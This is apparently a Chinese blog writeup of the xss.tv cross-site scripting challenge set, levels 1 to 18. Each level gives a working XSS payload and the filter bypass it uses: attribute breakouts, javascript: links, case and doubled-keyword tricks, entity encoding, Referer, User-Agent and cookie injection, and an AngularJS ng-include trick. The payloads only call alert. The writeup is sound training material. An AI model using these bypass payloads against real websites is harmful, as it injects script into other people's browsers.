---
title: "xss.tv Writeup"
date: 2018-08-04T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['ctf','xss']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


[test.xss.tv](http://test.xss.tv/)

最短 xss 平台的题目, 一共20关.

19关和20关没做, 都是 xsf, 之前审计过 flash 文件也没啥好印象.

这个相对于之前的 xss challenges 真是一点 Hint 都没有, 不过可以显示出 payload 的长度.

<!--more-->

## level 1

最简单的.

`<svg onload=alert(0)>`

## level 2

输出在 value 内, 闭合标签后再插入 payload.

也可以用 on 事件, 不过这是下一题的考点.

`"><img src=0 onerror=alert(0)>`

## level 3

单引号闭合.

`1' onmouseover='alert(0)`

## level 4

双引号闭合.

`" onmouseover="alert(0)`

## level 5

on 事件被转义成 `o_n`, script 标签也被转义成 `scr_ipt`.

换一个姿势.

`"><a href=javascript:alert(0)>`

## level 6

on href src 都被加上了下划线.

大小写绕过.

`<a HrEf="javascript:alert(0)">click</a>`

## level 7

这题没有转义, 只是把 on href src script 替换成空, 但只替换了一次.

`"><a hrhrefef="javascscriptript:alert(0)">click</a>`

## level 8

关键字都被加上了下划线, 用 html 的自解码机制就可以绕过.

`javasc&#114;ipt:alert(0)`

## level 9

keyword 中没有 `http://` 就显示为非法链接.

其它的都和上题一样.

`javasc&#114;ipt:alert(&#34;http://&#34;)`

## level 10

查看源代码发现有三个隐藏参数, `t_link t_history t_sort`, 其中只有 `t_sort` 可控.

由于标签是 hidden 的就不能触发 on 事件, 所以要改回 text 状态.

`1" type="text" onmouseover="alert(0)`

## level 11

隐藏参数多了个 `t_referer`, 抓包修改 referer 即可.

`1" type="text" onmouseover="alert(0)`

## level 12

抓包修改 user-agent.

`1" type="text" onmouseover="alert(0)`

## level 13

打开后发现多了个 cookie `user=call me maybe`, 直接修改 cookie 重新访问页面.

`1" type="text" onmouseover="alert(0)`

## level 14

这题做的很迷, 打开后直接就是 401 认证, 乱输几个 payload 也没屌用.

在网上看了 writeup 后才发现是图片 exif 信息的 xss.

估计网站已经关闭了, 就直接跳过吧.

## level 15

查看源代码发现 ng-include 这个参数, 百度一会发现这是 angularjs 的语句, 好像和 php 的文件包含差不多.

src 直接包含第一关的内容传参 keyword 为 payload, 并没啥屌用, 后来才发现是 script 标签包含 angularjs 所在的网站被墙了, 恰好又是我大谷歌的地址.

包含的时候要加上单引号.

`'level1.php?keyword=<svg onload=alert(0)>'`

## level 16

反斜杠空格什么的都被替换成了 `&nbsp;`,  两个换行符就可以干掉它.

`<svg%0a%0aonload=alert(0)>`

## level 17

写的是 xsf, 其实只要在 arg02 后面加上 payload 就行了.

`1 onmouseover=alert(0)`

## level 18

同 level 17.

`1 onmouseover=alert(0)`